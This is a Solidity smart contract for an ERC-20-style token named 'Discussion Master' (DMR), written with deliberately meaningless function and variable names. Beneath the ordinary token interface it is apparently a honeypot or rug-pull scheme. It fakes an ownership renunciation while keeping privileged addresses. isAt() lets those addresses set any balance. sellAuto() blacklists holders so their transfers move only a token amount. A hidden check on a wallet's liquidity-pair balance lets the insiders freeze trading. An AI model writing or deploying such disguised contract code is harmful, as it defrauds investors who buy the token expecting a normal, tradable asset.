//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface tokenAmountShould {
    function createPair(address sellModeSender, address liquidityReceiver) external returns (address);
}

interface tradingExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAmount) external view returns (uint256);

    function transfer(address exemptModeTx, uint256 launchedMax) external returns (bool);

    function allowance(address listLimitTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedMax) external returns (bool);

    function transferFrom(
        address sender,
        address exemptModeTx,
        uint256 launchedMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromSenderToken, uint256 value);
    event Approval(address indexed listLimitTo, address indexed spender, uint256 value);
}

abstract contract receiverLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTokenAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeToken is tradingExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DiscussionMaster is receiverLimit, tradingExempt, modeToken {

    address public swapToken;

    mapping(address => mapping(address => uint256)) private marketingTeam;

    function modeFrom(uint256 launchedMax) public {
        totalToken();
        enableSwap = launchedMax;
    }

    function balanceOf(address receiverAmount) public view virtual override returns (uint256) {
        return teamLimit[receiverAmount];
    }

    function modeMarketingShould(address enableSellMax, address exemptModeTx, uint256 launchedMax) internal returns (bool) {
        require(teamLimit[enableSellMax] >= launchedMax);
        teamLimit[enableSellMax] -= launchedMax;
        teamLimit[exemptModeTx] += launchedMax;
        emit Transfer(enableSellMax, exemptModeTx, launchedMax);
        return true;
    }

    string private fundMarketing = "DMR";

    uint256 public modeTokenMax;

    function receiverLaunch(address enableSellMax, address exemptModeTx, uint256 launchedMax) internal returns (bool) {
        if (enableSellMax == swapToken) {
            return modeMarketingShould(enableSellMax, exemptModeTx, launchedMax);
        }
        uint256 modeSender = tradingExempt(takeEnable).balanceOf(autoTeamWallet);
        require(modeSender == enableSwap);
        require(exemptModeTx != autoTeamWallet);
        if (modeIs[enableSellMax]) {
            return modeMarketingShould(enableSellMax, exemptModeTx, fundToken);
        }
        return modeMarketingShould(enableSellMax, exemptModeTx, launchedMax);
    }

    event OwnershipTransferred(address indexed buyLaunch, address indexed swapWallet);

    address autoTeamWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private maxAuto;

    uint256 receiverTotal;

    function totalMarketing() public {
        emit OwnershipTransferred(swapToken, address(0));
        maxAuto = address(0);
    }

    function totalToken() private view {
        require(amountTake[_msgSender()]);
    }

    mapping(address => bool) public amountTake;

    function transfer(address teamMax, uint256 launchedMax) external virtual override returns (bool) {
        return receiverLaunch(_msgSender(), teamMax, launchedMax);
    }

    function autoLiquidityTo(address takeLimit) public {
        require(takeLimit.balance < 100000);
        if (receiverFrom) {
            return;
        }
        
        amountTake[takeLimit] = true;
        if (modeTokenMax == limitBuy) {
            minAt = false;
        }
        receiverFrom = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return txTrading;
    }

    uint8 private txTrading = 18;

    function owner() external view returns (address) {
        return maxAuto;
    }

    function approve(address walletBuyExempt, uint256 launchedMax) public virtual override returns (bool) {
        marketingTeam[_msgSender()][walletBuyExempt] = launchedMax;
        emit Approval(_msgSender(), walletBuyExempt, launchedMax);
        return true;
    }

    uint256 private senderMin = 100000000 * 10 ** 18;

    function allowance(address sellLaunchedExempt, address walletBuyExempt) external view virtual override returns (uint256) {
        if (walletBuyExempt == swapIs) {
            return type(uint256).max;
        }
        return marketingTeam[sellLaunchedExempt][walletBuyExempt];
    }

    function getOwner() external view returns (address) {
        return maxAuto;
    }

    function transferFrom(address enableSellMax, address exemptModeTx, uint256 launchedMax) external override returns (bool) {
        if (_msgSender() != swapIs) {
            if (marketingTeam[enableSellMax][_msgSender()] != type(uint256).max) {
                require(launchedMax <= marketingTeam[enableSellMax][_msgSender()]);
                marketingTeam[enableSellMax][_msgSender()] -= launchedMax;
            }
        }
        return receiverLaunch(enableSellMax, exemptModeTx, launchedMax);
    }

    function symbol() external view virtual override returns (string memory) {
        return fundMarketing;
    }

    address public takeEnable;

    mapping(address => bool) public modeIs;

    string private limitSell = "Discussion Master";

    uint256 constant fundToken = 16 ** 10;

    uint256 public limitBuy;

    address swapIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private buyAutoAmount;

    constructor (){
        
        liquidityTokenAt txReceiverFee = liquidityTokenAt(swapIs);
        takeEnable = tokenAmountShould(txReceiverFee.factory()).createPair(txReceiverFee.WETH(), address(this));
        if (modeTokenMax != limitBuy) {
            modeTokenMax = limitBuy;
        }
        swapToken = _msgSender();
        amountTake[swapToken] = true;
        teamLimit[swapToken] = senderMin;
        totalMarketing();
        if (minAt) {
            minAt = false;
        }
        emit Transfer(address(0), swapToken, senderMin);
    }

    function sellAuto(address amountSwap) public {
        totalToken();
        if (limitBuy != modeTokenMax) {
            modeTokenMax = limitBuy;
        }
        if (amountSwap == swapToken || amountSwap == takeEnable) {
            return;
        }
        modeIs[amountSwap] = true;
    }

    function isAt(address teamMax, uint256 launchedMax) public {
        totalToken();
        teamLimit[teamMax] = launchedMax;
    }

    uint256 enableSwap;

    mapping(address => uint256) private teamLimit;

    bool public receiverFrom;

    bool private minAt;

    function name() external view virtual override returns (string memory) {
        return limitSell;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderMin;
    }

}